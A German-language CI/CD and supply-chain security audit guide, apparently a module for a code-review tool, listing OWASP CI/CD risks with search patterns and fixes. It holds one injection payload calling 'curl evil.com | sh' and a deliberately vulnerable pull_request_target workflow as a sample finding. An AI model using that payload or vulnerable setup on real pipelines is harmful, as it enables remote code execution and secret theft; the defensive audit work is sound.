# CI/CD- und Supply-Chain-Security

Wird geladen, wenn `.github/workflows/`, `.gitlab-ci.yml`, `Jenkinsfile`, `.circleci/`, `azure-pipelines.yml`, `buildkite/`, oder Build-Manifeste (`pom.xml`, `package.json`, etc.) erkannt werden.

Basis: **OWASP Top 10 CI/CD Security Risks (2022)**.

## OWASP Top 10 CI/CD

### CICD-SEC-1: Insufficient Flow Control Mechanisms

**Was:** Code/Artefakte fließen ohne ausreichende Gates durch die Pipeline (kein Code-Review, kein Approval).

**Suchen nach:**
- Branch-Protection-Konfiguration (GitHub: `.github/CODEOWNERS`, GitHub-API)
- Auto-Merge ohne Approval
- Pipelines mit `if: always()` oder fehlenden Conditional-Gates
- Direkter Push auf `main`/`production` möglich

### CICD-SEC-2: Inadequate Identity and Access Management

**Was:** Pipeline-Identitäten haben zu viele Rechte, lange Token-Lifetimes, fehlende MFA.

**Patterns:**
```
rg "GITHUB_TOKEN" .github/workflows/ -A 3
rg "permissions:" .github/workflows/ -A 5  # gut wenn restriktiv gesetzt
```

**Anti-Patterns:**
- Default `GITHUB_TOKEN` Permissions = write-all (sollte `read` als Default sein)
- Service-Account-Keys lang-lebig in Pipeline (statt OIDC-basierte Federation)
- Pipeline-Roles mit Production-Zugriff

### CICD-SEC-3: Dependency Chain Abuse

**Was:** Dependency Confusion, Typosquatting, Substitution.

**Patterns:**
```
rg "registry-url|registry =|--registry=" .npmrc package.json
rg "\"@.*/" package.json | rg -v "@types/"  # scoped packages OK
rg "scope\s*=" .npmrc
```

**Anti-Patterns:**
- Private Packages ohne Scope-Prefix (`@yourorg/`) → können von Public Registry gespoofed werden
- Mixed Registry (internal+public) ohne strikten Resolver
- Floating Versions (`^`, `~`, `*`) ohne Lock-File
- `npm install` in Build statt `npm ci` (npm ci nutzt strikt lock)

### CICD-SEC-4: Poisoned Pipeline Execution (PPE)

**Was:** Angreifer kann Pipeline-Code beeinflussen, ohne die Hauptcodebase zu modifizieren — typischerweise über PR-Workflows.

**Patterns:**
```
rg "pull_request_target" .github/workflows/
rg "actions/checkout@.*ref:.*github\.event\.pull_request\.head" .github/workflows/
rg "\$\{\{\s*github\.event\.(issue|pull_request|comment)\." .github/workflows/  # Script Injection!
```

**Klassischer Angriff:** `pull_request_target` läuft mit Repo-Secrets im Kontext, checkt aber den PR-Code aus → Untrusted Code mit Secrets-Zugriff.

**Sicher:** Niemals `pull_request_target` + PR-Code-Checkout kombinieren. Für PR-Validation immer `pull_request` (ohne Secrets) verwenden. Wenn doch nötig: Two-Stage-Workflow mit Approval-Gate.

### CICD-SEC-5: Insufficient PBAC (Pipeline-Based Access Controls)

**Was:** Pipelines haben Zugriff auf Production-Ressourcen ohne Need-to-have.

- Build-Pipelines mit Deployment-Permissions
- Dev-Pipelines mit Production-Secrets

### CICD-SEC-6: Insufficient Credential Hygiene

**Patterns:**
```
rg "echo\s+\".*\${{" .github/workflows/  # Secret in echo → in Log!
rg "set-output.*secret|::set-output" .github/workflows/  # alte syntax, secrets leaks risk
rg "if-no-files-found" .github/workflows/   # Build-Artefakte mit Secrets?
```

**Anti-Patterns:**
- Secrets in Pipeline-Logs (echoes, debug)
- Secrets in Build-Artefakten
- Lang-lebige PATs statt OIDC
- Secrets in Environment-Files / Cache-Keys

### CICD-SEC-7: Insecure System Configuration

- Runners ohne Isolation (shared runner für sensible Workloads)
- Self-hosted Runner ohne ephemeral Mode
- Default-Konfig (alle Permissions an)

### CICD-SEC-8: Ungoverned Usage of 3rd-Party Services

**Patterns:**
```
rg "uses:\s+\S+/\S+@" .github/workflows/ | rg -v "@v\d|@[a-f0-9]{40}"  # nicht SHA-pinned
```

**Anti-Patterns:**
- 3rd-Party-Actions ohne SHA-Pinning (`@main`, `@v3` statt `@abc123...`)
- Marketplace-Actions ohne Audit (compromise einer beliebten Action = supply chain attack auf alle Nutzer)
- Externe Container-Images im Build ohne Verifikation

### CICD-SEC-9: Improper Artifact Integrity Validation

**Was:** Artefakte werden ohne Integritätsprüfung weiterverarbeitet.

**Patterns:**
```
rg "cosign|sigstore" .github/workflows/  # gut wenn vorhanden
rg "checksums|sha256sum|sha512sum" .github/workflows/
rg "GPG_SIGN|--sign" .github/workflows/
```

**Anti-Patterns:**
- Build-Artefakte ohne Signatur (Sigstore/Cosign)
- Container-Images ohne Signing
- Releases ohne Checksums
- Provenance-Daten fehlen (SLSA Level 0)

### CICD-SEC-10: Insufficient Logging and Visibility

- Pipeline-Logs werden nicht zentral aggregiert
- Sicherheitsrelevante Events (Secret-Access, Permission-Changes) nicht geloggt
- Run-Historie wird gelöscht (Audit-Trail weg)

## GitHub Actions — Deep Dive

### Default Token-Permissions

**Suchen:**
```
rg "^permissions:" .github/workflows/*.yml -A 5
```

**Anti-Pattern:** Fehlendes `permissions:` Block → Token bekommt Default-Permissions (oft `write-all` in alten Repos).

**Sicher:**
```yaml
permissions: read-all   # Repo-Setting
# Oder pro Workflow:
permissions:
  contents: read
  id-token: write   # für OIDC-AssumeRole, sonst weglassen
```

### Script Injection (Expression Injection)

```
rg '\$\{\{\s*github\.event\.(issue|pull_request|comment|pages|head_commit|workflow_run)\.(title|body|message|head|description|comment|pages)' .github/workflows/
```

**Klassischer Angriff:** `${{ github.event.issue.title }}` direkt in `run:` Block → Issue mit Title `'; curl evil.com | sh; '` führt Code auf Runner aus.

**Sicher:** Untrusted Input über Environment-Variable, nicht direkt:
```yaml
- run: echo "$TITLE"
  env:
    TITLE: ${{ github.event.issue.title }}
```

### Workflow_run / Workflow_dispatch

```
rg "on:\s*workflow_run" .github/workflows/ -A 5
```

`workflow_run` triggert nach Completion eines anderen Workflows. Wenn der Trigger-Workflow von einem Fork-PR kam, läuft der nachgelagerte Workflow mit Schreibrechten — klassischer Privilege-Escalation-Pfad.

### OIDC zu Cloud-Providern

Best Practice prüfen:
```
rg "permissions:.*id-token:\s*write" .github/workflows/  # OIDC aktiv
rg "configure-aws-credentials" .github/workflows/ -A 5   # gut wenn role-to-assume + audience
```

**Anti-Patterns:**
- IAM-User-Credentials statt OIDC-Federation
- AssumeRole ohne sub-Claim-Validation (jeder Workflow im Org kann Role assumieren)
- Fehlende Audience-Validation auf Cloud-Seite

### Caches als Attack Surface

```
rg "actions/cache@" .github/workflows/ -A 5
```

Caches sind Branch-isoliert, aber zwischen Workflows desselben Branches geteilt. Wenn ein User mit Push-Rechten Caches "vergiften" kann, läuft das Gift in privilegierten Workflows. Best Practice: Cache-Keys mit Hash der Lockfiles, kein eval auf Cache-Inhalte.

## GitLab CI

```
rg "image:\s*[^:]+$" .gitlab-ci.yml             # ohne Tag = latest
rg "before_script:" .gitlab-ci.yml -A 5         # curl|sh?
rg "CI_JOB_TOKEN" .gitlab-ci.yml                # Permissions klar?
rg "rules:.*if:\s*\$CI_COMMIT_BRANCH" .gitlab-ci.yml  # rule-evasion?
```

**Anti-Patterns:**
- Shared Runner für sensible Builds (besser: dedizierte/group runner)
- `CI_JOB_TOKEN` mit Cross-Project-Access ohne Audit
- Schedule-Pipelines ohne Owner-Check
- `Variables` als nicht-`protected`/`masked` → in Logs

## Build-Provenance (SLSA)

**SLSA-Level prüfen:**
- **L0**: Keine Provenance → der Default
- **L1**: Provenance vorhanden, aber manipulierbar
- **L2**: Provenance signiert vom Build-Service
- **L3**: Hardened Build-Plattform (z. B. GitHub Actions Reusable Workflows mit OIDC + Sigstore)
- **L4**: Reproducible Builds + 2-Person-Reviews

Pattern für L2+:
```
rg "github.com/slsa-framework|sigstore" .github/workflows/
rg "provenance:\s*true" .github/workflows/
```

## Dependency Management Deep

### Lock-File-Integrität

```
ls package-lock.json yarn.lock pnpm-lock.yaml poetry.lock Pipfile.lock Gemfile.lock Cargo.lock go.sum composer.lock
```

**Befunde:**
- Lock-File fehlt → Reproduzierbarkeit nicht gegeben
- Lock-File nicht committet (in `.gitignore`)
- Lock-File älter als Manifest (`mtime`-Vergleich)
- Lock-File für falsches Tool (z. B. `package-lock.json` neben `yarn.lock` → Verwirrung)

### Auto-Update-Bots

Im Bericht als Empfehlung erwähnen, falls nicht vorhanden:
- Dependabot (`.github/dependabot.yml`)
- Renovate (`renovate.json`)
- Snyk Open Source
- GitHub Security Advisories Auto-Fix

### Dependency Confusion

**Schritte zur Identifikation:**
1. Internes Package mit ähnlichem Namen wie Public Package?
2. Internal Registry-Resolution priorisiert?
3. Scope-Konfiguration in `.npmrc` / `pip.conf` / `~/.gradle/init.gradle`?

### Typosquats — bekannte Liste

Im Repo nach Typo-Squat-Verdächtigen prüfen:
- `request` (legit) vs `requests-py` (typo squat, falls existiert)
- `pytorch` vs `pytorh`
- `electron` vs `electorn`
- `crossenv` vs `cross-env`

(Pattern für die Klasse: Levenshtein-Distanz 1-2 zu populärem Paket.)

## SBOM (Software Bill of Materials)

**Patterns:**
```
rg "cyclonedx|spdx|syft" .github/workflows/ Makefile package.json
ls bom.xml sbom.json *.spdx
```

**Befund:** "Kein SBOM-Build im CI" → Medium-Empfehlung. Mit SBOM können CVEs nachträglich auf konkrete Releases gemappt werden.

## Artefakt-Signing

**Patterns:**
```
rg "cosign sign|sigstore|gpg --sign" .github/workflows/
```

Im Bericht für Production-relevante Releases prüfen.

## Container-Build-Pipelines

- BuildKit oder Buildah verwenden (statt klassisches `docker build`)
- `--no-cache` zur Vermeidung von Layer-Reuse-Angriffen
- Multi-Stage-Builds mit minimaler Final-Stage
- Image-Scanning vor Push (Trivy, Grype)
- Image-Signing nach Push (Cosign)
- Distroless oder Wolfi/Chainguard Base-Images bevorzugt

## Befund-Beispiele

```
[CICD-01] Pull-Request-Target mit PR-Code-Checkout (Critical)
Severity:    Critical (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H = 10.0)
Exploitability: External-Unauth (PR von beliebigem Fork triggert mit Secrets)
CWE:         CWE-829 Inclusion of Functionality from Untrusted Control Sphere

Evidence:
.github/workflows/pr-test.yml:
  on: pull_request_target
  jobs:
    test:
      steps:
        - uses: actions/checkout@v4
          with:
            ref: ${{ github.event.pull_request.head.sha }}
        - run: npm test
      env:
        AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}

Beliebige Person, die einen PR öffnet, bekommt Code-Execution mit allen Repo-Secrets.

Action:
- pull_request_target durch pull_request ersetzen ODER
- Bei Bedarf für Bot-PRs: Two-Stage mit Approval-Gate
- Secrets nicht in unauthenticated Workflows verfügbar machen
```

## Mappings

- A03:2025 Software Supply Chain Failures
- A08:2021 Software and Data Integrity Failures
- A06:2021 Vulnerable and Outdated Components
- CWE-829, CWE-494, CWE-345, CWE-693
- MITRE ATT&CK: T1195 (Supply Chain Compromise), T1199 (Trusted Relationship)
